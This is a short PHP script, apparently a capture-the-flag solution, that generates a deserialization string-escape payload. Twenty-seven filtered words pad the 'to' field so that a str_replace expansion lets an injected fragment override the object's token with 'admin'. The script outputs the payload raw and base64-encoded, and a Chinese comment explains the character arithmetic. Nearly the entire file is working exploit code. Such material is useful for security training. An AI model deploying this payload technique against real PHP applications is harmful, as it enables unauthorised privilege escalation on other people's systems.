<?php
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}
$f = 1;
$m = 1;
$t = 'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}';
//";s:5:"token";s:5:"admin";} 逃逸27个字符需要27个fuck 反序列化结尾标识符为";}
$msg = new message($f,$m,$t);
$umsg = str_replace('fuck', 'loveU', serialize($msg));
echo $umsg;
echo "\n";
echo base64_encode($umsg);
